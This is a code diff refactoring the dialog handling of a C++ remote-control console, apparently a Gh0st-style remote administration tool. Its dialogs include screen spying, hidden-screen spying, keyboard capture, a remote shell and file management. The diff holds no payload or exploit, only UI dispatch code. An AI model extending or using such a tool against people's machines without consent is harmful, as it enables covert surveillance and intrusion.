@@ -1644,93 +1644,10 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 
 	AUTO_TICK(50);
 
-	switch (ContextObject->v1)
-	{
-	case VIDEO_DLG:
-	{
-		CVideoDlg* Dlg = (CVideoDlg*)ContextObject->hDlg;
+	if (ContextObject->v1) {
+		DialogBase* Dlg = (DialogBase*)ContextObject->hDlg;
 		Dlg->OnReceiveComplete();
-		break;
-	}
-	case SERVICES_DLG:
-	{
-		CServicesDlg* Dlg = (CServicesDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case AUDIO_DLG:
-	{
-		CAudioDlg* Dlg = (CAudioDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case SYSTEM_DLG:
-	{
-		CSystemDlg* Dlg = (CSystemDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case SHELL_DLG:
-	{
-		CShellDlg* Dlg = (CShellDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case SCREENSPY_DLG:
-	{
-		CScreenSpyDlg* Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case FILEMANAGER_DLG:
-	{
-		CFileManagerDlg* Dlg = (CFileManagerDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case REGISTER_DLG:
-	{
-		CRegisterDlg* Dlg = (CRegisterDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case KEYBOARD_DLG:
-	{
-		CKeyBoardDlg* Dlg = (CKeyBoardDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case PROXY_DLG: {
-		CProxyMapDlg* Dlg = (CProxyMapDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case HIDESCREEN_DLG: {
-		CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case MACHINE_DLG: {
-		CMachineDlg* Dlg = (CMachineDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case CHAT_DLG: {
-		CChat* Dlg = (CChat*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case DECRYPT_DLG: {
-		DecryptDlg* Dlg = (DecryptDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	case FILEMGR_DLG: {
-		file::CFileManagerDlg* Dlg = (file::CFileManagerDlg*)ContextObject->hDlg;
-		Dlg->OnReceiveComplete();
-		break;
-	}
-	default: {
+	} else {
 		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 		if (hEvent == NULL) {
 			Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
@@ -1743,7 +1660,6 @@ VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
 		}
 		HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
 		DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
-	}
 	}
 }
 
@@ -2052,99 +1968,9 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 	dlgInfo *p = (dlgInfo *)wParam;
 	if (p)
 	{
-		switch(p->v1)
-		{
-		case TALK_DLG:
-			{
-				CTalkDlg *Dlg = (CTalkDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case VIDEO_DLG:
-			{
-				CVideoDlg *Dlg = (CVideoDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case SERVICES_DLG:
-			{
-				CServicesDlg *Dlg = (CServicesDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case AUDIO_DLG:
-			{
-				CAudioDlg *Dlg = (CAudioDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case SYSTEM_DLG:
-			{
-				CSystemDlg *Dlg = (CSystemDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case SHELL_DLG:
-			{
-				CShellDlg *Dlg = (CShellDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case SCREENSPY_DLG:
-			{
-				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case FILEMANAGER_DLG:
-			{
-				CFileManagerDlg *Dlg = (CFileManagerDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case REGISTER_DLG:
-			{
-				CRegisterDlg *Dlg = (CRegisterDlg*)p->hDlg;
-				delete Dlg; //特殊处理
-				break;
-			}
-		case KEYBOARD_DLG:
-			{
-				CKeyBoardDlg* Dlg = (CKeyBoardDlg*)p->hDlg;
-				delete Dlg;
-				break;
-			}
-		case HIDESCREEN_DLG:
-		{
-			CHideScreenSpyDlg* Dlg = (CHideScreenSpyDlg*)p->hDlg;
-			delete Dlg;
-			break;
-		}
-		case MACHINE_DLG:
-		{
-			CMachineDlg* Dlg = (CMachineDlg*)p->hDlg;
-			delete Dlg;
-			break;
-		}
-		case CHAT_DLG:
-		{
-			CChat* Dlg = (CChat*)p->hDlg;
-			delete Dlg;
-			break;
-		}
-		case DECRYPT_DLG:
-		{
-			DecryptDlg* Dlg = (DecryptDlg*)p->hDlg;
-			delete Dlg;
-			break;
-		}
-		case FILEMGR_DLG:
-		{
-			file::CFileManagerDlg* Dlg = (file::CFileManagerDlg*)p->hDlg;
+		if (p->v1) {
+			CDialogBase* Dlg = (CDialogBase*)p->hDlg;
 			::PostMessageA(Dlg->GetSafeHwnd(), WM_CLOSE, 0, 0);
-			break;
-		}
-		default:break;
 		}
 		delete p;
 		p = NULL;
@@ -2220,267 +2046,83 @@ VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
 
 LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOWMAXIMIZED);
-
-	ContextObject->v1   = SCREENSPY_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_FILE, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = FILEMANAGER_DLG;
-	ContextObject->hDlg = Dlg;
-	EnterCriticalSection(&m_cs);
-	/*
-	for (std::vector<CFileManagerDlg *>::iterator iter = v_FileDlg.begin(); 
-		iter != v_FileDlg.end(); )
-	{
-		CFileManagerDlg *cur = *iter;
-		if (cur->m_bIsClosed)
-		{
-			delete cur;
-			iter = v_FileDlg.erase(iter);
-		}else{
-			++iter;
-		}
-	}
-	v_FileDlg.push_back(Dlg);
-	*/
-	LeaveCriticalSection(&m_cs);
-
-	return 0;
+	return OpenDialog<CFileManagerDlg, IDD_FILE>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = TALK_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CTalkDlg, IDD_DIALOG_TALK>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = SHELL_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CShellDlg, IDD_DIALOG_SHELL>(wParam, lParam);
 }
 
 
 LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = SYSTEM_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CSystemDlg, IDD_DIALOG_SYSTEM>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = AUDIO_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CAudioDlg, IDD_DIALOG_AUDIO>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = SERVICES_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CServicesDlg, IDD_DIALOG_SERVICES>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = REGISTER_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CRegisterDlg, IDD_DIALOG_REGISTER>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	//转到CFileManagerDlg  构造函数
-	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1   = VIDEO_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CVideoDlg, IDD_DIALOG_VIDEO>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CKeyBoardDlg* Dlg = new CKeyBoardDlg(this, m_iocpServer, ContextObject);
-	// 设置父窗口为卓面
-	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //创建非阻塞的Dlg
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = KEYBOARD_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CKeyBoardDlg, IDD_DLG_KEYBOARD>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CProxyMapDlg* Dlg = new CProxyMapDlg(this, m_iocpServer, ContextObject);
-	Dlg->Create(IDD_PROXY, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = PROXY_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CProxyMapDlg, IDD_PROXY>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CHideScreenSpyDlg* Dlg = new CHideScreenSpyDlg(this, m_iocpServer, ContextObject);
-
-	Dlg->Create(IDD_SCREEN, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = HIDESCREEN_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CHideScreenSpyDlg, IDD_SCREEN>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CMachineDlg* Dlg = new CMachineDlg(this, m_iocpServer, ContextObject);
-
-	Dlg->Create(IDD_MACHINE, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = MACHINE_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CMachineDlg, IDD_MACHINE>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenChatDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	CChat* Dlg = new CChat(this, m_iocpServer, ContextObject);
-
-	Dlg->Create(IDD_CHAT, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = CHAT_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<CChat, IDD_CHAT>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	DecryptDlg* Dlg = new DecryptDlg(this, m_iocpServer, ContextObject);
-
-	Dlg->Create(IDD_DIALOG_DECRYPT, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = DECRYPT_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<DecryptDlg, IDD_DIALOG_DECRYPT>(wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam)
 {
-	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
-
-	file::CFileManagerDlg* Dlg = new file::CFileManagerDlg(this, m_iocpServer, ContextObject);
-
-	Dlg->Create(IDD_FILE_WINOS, GetDesktopWindow());
-	Dlg->ShowWindow(SW_SHOW);
-
-	ContextObject->v1 = FILEMGR_DLG;
-	ContextObject->hDlg = Dlg;
-
-	return 0;
+	return OpenDialog<file::CFileManagerDlg, IDD_FILE_WINOS>(wParam, lParam);
 }
 
 BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
